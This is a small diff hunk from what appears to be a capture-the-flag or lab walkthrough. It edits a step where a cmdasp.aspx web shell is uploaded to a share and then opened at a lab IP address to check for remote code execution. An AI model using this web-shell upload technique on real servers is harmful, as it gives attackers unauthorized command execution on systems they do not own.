@@ -186,7 +186,7 @@ Check for RCE first:
 > put cmdasp.aspx
 ```
 
-Navigate: "http://10.80.131.73:49663/nt4wrksv/cmdasp.aspx"
+Navigate: http://10.80.131.73:49663/nt4wrksv/cmdasp.aspx
 
 Then:
 ```text
